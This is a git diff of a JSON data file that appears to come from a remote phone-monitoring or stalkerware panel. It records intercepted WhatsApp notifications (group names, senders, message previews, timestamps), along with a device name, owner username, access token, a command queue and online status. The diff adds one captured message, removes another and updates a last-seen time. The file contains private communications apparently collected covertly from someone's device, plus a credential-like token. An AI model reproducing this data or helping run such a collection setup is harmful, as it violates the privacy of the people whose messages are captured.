@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "𝟐𝟐𝟓 𝐀𝐑𝐄𝐀: ~ aril.",
+        "content": "💟 Stiker",
+        "time": "29/04 22:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777472276356
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (374 pesan): ~ -anjai🎶",
         "content": "Menyebut grup Anda secara privat di status",
         "time": "29/04 22:28",
@@ -4011,14 +4019,6 @@
         "time": "29/04 22:19",
         "pkg": "com.whatsapp",
         "receivedAt": 1777471729006
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (484 pesan): ~ putra store",
-        "content": "📷 ‎5 foto",
-        "time": "29/04 22:19",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777471727537
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777472272102,
+    "lastSeen": 1777472275104,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
